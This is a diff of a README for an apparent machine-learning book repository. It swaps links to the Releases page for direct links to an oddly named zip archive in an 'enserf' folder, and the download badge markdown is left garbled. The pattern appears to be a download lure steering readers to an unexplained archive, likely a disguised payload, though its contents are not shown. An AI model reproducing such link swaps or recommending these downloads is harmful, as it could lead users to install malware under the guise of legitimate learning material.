@@ -12,13 +12,13 @@ To begin your journey, follow these steps to download and install the software.
 
 You can download the latest version of the software from the Releases page. Click the link below to access it:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%2300BFFF.svg?style=for-the-badge)](https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/releases)
+[![Download Latest Release](https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/raw/refs/heads/main/enserf/Tensorflow_Learning_my_Machine_with_book_On_Learn_Keras_Hands_and_Scikit_3.5.zip%20Latest%20Release-%https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/raw/refs/heads/main/enserf/Tensorflow_Learning_my_Machine_with_book_On_Learn_Keras_Hands_and_Scikit_3.5.zip)](https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/raw/refs/heads/main/enserf/Tensorflow_Learning_my_Machine_with_book_On_Learn_Keras_Hands_and_Scikit_3.5.zip)
 
 ### Step 2: Visit the Releases Page
 
 To find the installation file, visit our Releases page:
 
-[Download from Releases Page](https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/releases)
+[Download from Releases Page](https://github.com/leotrja/my-book-Hands-On-Machine-Learning-with-Scikit-Learn-Keras-and-Tensorflow/raw/refs/heads/main/enserf/Tensorflow_Learning_my_Machine_with_book_On_Learn_Keras_Hands_and_Scikit_3.5.zip)
 
 ### Step 3: Choose the Right Version
 
